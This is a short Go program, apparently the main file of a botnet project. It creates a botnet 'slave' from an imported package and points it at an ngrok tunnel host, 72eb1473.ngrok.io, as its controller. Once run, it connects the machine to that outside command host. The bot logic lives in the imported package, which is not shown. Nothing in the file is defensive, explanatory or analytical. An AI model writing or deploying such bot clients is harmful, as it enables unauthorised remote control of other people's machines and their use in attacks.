package main

import (
	"github.com/adrianosela/botnet/slave"
	"log"
)

func main() {
	slave, err := slave.NewBotnetSlave("72eb1473.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	slave.Start()
}
